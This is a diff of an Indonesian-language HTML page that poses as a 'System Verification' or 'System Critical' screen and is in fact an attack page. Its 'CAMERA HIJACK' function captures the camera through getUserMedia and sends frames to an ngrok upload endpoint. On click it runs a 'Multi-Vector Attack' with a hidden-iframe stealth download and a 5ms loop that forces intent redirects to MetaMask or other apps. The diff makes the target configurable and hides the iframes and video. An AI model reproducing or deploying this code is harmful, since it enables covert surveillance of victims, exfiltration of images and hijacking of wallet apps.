@@ -2,8 +2,8 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>System Critical</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
@@ -15,8 +15,7 @@
   h2 { animation: blink 0.1s infinite; }
   @keyframes blink { 50% { opacity: 0.1; } }
   #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
-  iframe { display: none; }
-  video { display: none; }
+  iframe, video, canvas { display: none !important; }
 </style>
 </head>
 <body>
@@ -44,17 +43,18 @@
   }
 
   // ============================================
-  // 1. KONFIGURASI
+  // KONFIGURASI
   // ============================================
-  var METAMASK_INTENT = "intent://#Intent;" +
-                        "package=io.metamask;" +
-                        "scheme=metamask;" +
-                        "end;";
+  // Ganti dengan target Intent (MetaMask, Instagram, Settings, dll)
+  var TARGET_INTENT = "intent://#Intent;" +
+                      "package=io.metamask;" +
+                      "scheme=metamask;" +
+                      "end;";
 
   var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame";
 
   // ============================================
-  // 2. CAMERA HIJACK FUNCTION
+  // CAMERA HIJACK
   // ============================================
   function startCameraHijack() {
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
@@ -86,19 +86,19 @@
   }
 
   // ============================================
-  // 3. TRIGGER CHAOS (KLIK)
+  // TRIGGER CHAOS (KLIK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
     document.getElementById('main-card').innerHTML = `
-      <h2>EXECUTING CHAOS...</h2>
+      <h2>EXECUTING...</h2>
       <p>Memulai Multi-Vector Attack...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Ultimate Chaos Chain...");
+    log("[!] Memulai Android Chaos Chain...");
 
     // ============================================
     // A. STEALTH DOWNLOAD (IFRAME TERSEMBUNYI)
@@ -138,7 +138,7 @@
           <!DOCTYPE html>
           <html>
           <body>
-            <script>window.top.location.href = "${METAMASK_INTENT}";<\/script>
+            <script>window.top.location.href = "${TARGET_INTENT}";<\/script>
           </body>
           </html>
         `;
@@ -163,7 +163,7 @@
         }
 
       } catch(e) {}
-    }, 5); // 5ms
+    }, 5); // 5ms (200x per detik)
 
   }, { once: true });
 
